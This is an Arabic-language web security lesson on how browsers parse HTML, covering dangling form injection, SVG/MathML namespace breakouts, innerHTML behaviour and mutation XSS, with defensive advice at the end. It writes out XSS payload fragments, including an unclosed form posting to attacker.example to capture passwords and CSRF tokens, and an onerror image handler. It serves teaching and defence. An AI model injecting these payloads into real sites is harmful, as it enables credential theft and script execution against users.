الـ HTML Parser من جوه: إزاي المتصفح بيقرا الكود فعلًا

ده أهم درس في الجزء الأول للـ pentester. كل payload XSS، وكل bypass لفلتر أو sanitizer، هو في الحقيقة استغلال لقاعدة في الـ parser: إمتى tag بيبدأ وبيخلص، إيه اللي بيتفسّر كنص وإيه اللي بيتفسّر كـ markup، وإزاي المتصفح «بيصلّح» الكود الغلط. الـ parser ده متوصّف بالتفصيل في HTML Standard — كل المتصفحات الحديثة بتنفّذه بنفس الطريقة، فتقدر تتنبأ بيه بالظبط.

Dangling form و«خطف» عناصر الصفحة

قاعدة «الفورم التانية بتتجاهل» معناها: لو حقنت <form action="https://attacker.example/"> (من غير ما تقفلها) قبل فورم حقيقية في الصفحة، الـ <form> الحقيقية هتتجاهل، وكل الخانات اللي جواها (username، password، CSRF token) هتنضم لفورمك. وقاعدة «<body> التاني بيضيف attributes» معناها إن <body onload=…> في نص الصفحة لسه بيشتغل.

Foreign content: SVG وMathML قوانين تانية

لما الـ tree builder يدخل <svg> أو <math>، بيبقى في «foreign content»: الـ self-closing بيشتغل، الـ <![CDATA[…]]> مسموح، أسماء زي viewBox وforeignObject بتتظبط، والأهم: <style> و<title> جوه SVG مش raw text — الـ tags جواهم بتتفسّر! وفيه عناصر HTML لو ظهرت جوه SVG بـ«تهرب» منه وتقفله (زي p وdiv وimg وb وbr وtable…):

Foreign content

شوف الـ 🌳 DOM: الـ <img> اللي كان «جوه style جوه svg» طلع ابن لـ body — الـ img عنصر «breakout» فقفل الـ svg وخرج. 🎯 الـ sanitizers اللي بتحلّل HTML بطريقة مختلفة عن المتصفح في الحالات دي (namespace confusion) اتكسرت كتير بسببها.

Integration points

جوه SVG، العناصر foreignObject وdesc وtitle «HTML integration points»: اللي جواهم بيتقري HTML عادي. وفي MathML: mi، mo، mn، ms، mtext (text integration points)، وannotation-xml لو عليه encoding="text/html". مسارات الدخول والخروج دي بين الـ namespaces هي ملعب الـ mutation XSS.

template وinnerHTML: parsing من غير مستند كامل

  • <template>: المحتوى بيتـ parse لـ DocumentFragment خامل (template.content): الـ scripts مبتشتغلش، والصور مبتتحمّلش، لحد ما حد ينسخه للصفحة.
  • el.innerHTML = str: «fragment parsing» — بيتـ parse كأنه جوه العنصر ده (الـ context بيفرق: نفس النص جوه div غير جوه table). وأهم حقيقة أمنية: <script> اللي بيدخل بـ innerHTML مبيتنفّذش، لكن <img src=x onerror=…> بيتنفّذ.
  • new DOMParser().parseFromString(str, "text/html"): مستند كامل خامل (scripting مقفول) — بتستخدمه sanitizers كتير، ومعاه ملاحظة مهمة تحت.

mXSS: لما الـ HTML «يتحوّل» وهو بيتنقل

الـ sanitizer بياخد HTML، يعمله parse، يشيل الخطر، ويعمله serialize لنص تاني. الصفحة بتاخد النص ده وتعمله parse تاني (innerHTML). لو الـ parse التاني طلع شجرة مختلفة عن الأولى، الحاجة اللي اتشافت «آمنة» ممكن تتحوّل لخطيرة — ده mutation XSS. أشهر مصدر: الـ scripting flag. محتوى <noscript> بيتقري HTML لو الـ scripting مقفول (زي DOMParser)، ونص خام لو شغّال (الصفحة الحقيقية):

فعّل وقفّل «scripting شغّال» وقارن: مع الـ scripting مقفول فيه p عليه title بريء. مع الـ scripting شغّال، الـ </noscript> اللي جوه الـ title قفلت الـ noscript، والـ img بقى element حقيقي بـ onerror. الحيلة دي بالظبط اتستخدمت في mXSS على Google Search سنة 2019 (اكتشفها الباحث Masato Kinugawa) ضد sanitizer كان بيحلّل بـ scripting مقفول.

الدرس الدفاعي

(1) ماتعملش sanitize بنفسك بـ regex — استخدم مكتبة متحدّثة زي DOMPurify (بتشتغل على الـ DOM وبتتعامل مع الحالات دي). (2) الأفضل: متعملش serialize ثم parse تاني — حط النتيجة كـ DOM nodes مباشرة. (3) فيه API بيدخل المتصفحات تدريجيًا اسمه Sanitizer API (element.setHTML()) بيعمل parse + sanitize في خطوة واحدة جوه الـ context الصح — اتأكد من دعمه قبل ما تعتمد عليه. (4) وCSP كطبقة إضافية.
